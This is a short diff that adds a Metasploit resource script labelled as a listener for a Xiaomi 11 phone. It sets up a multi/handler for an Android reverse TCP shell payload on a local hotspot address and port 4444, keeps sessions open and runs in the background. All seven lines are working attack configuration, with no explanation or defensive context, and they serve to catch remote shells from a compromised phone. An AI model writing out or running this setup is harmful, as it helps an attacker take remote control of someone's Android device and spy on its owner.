@@ -1,0 +1,7 @@
+# Metasploit listener for Xiaomi 11
+use exploit/multi/handler
+set PAYLOAD android/shell/reverse_tcp
+set LHOST 192.168.43.1
+set LPORT 4444
+set EXITONSESSION false
+exploit -j
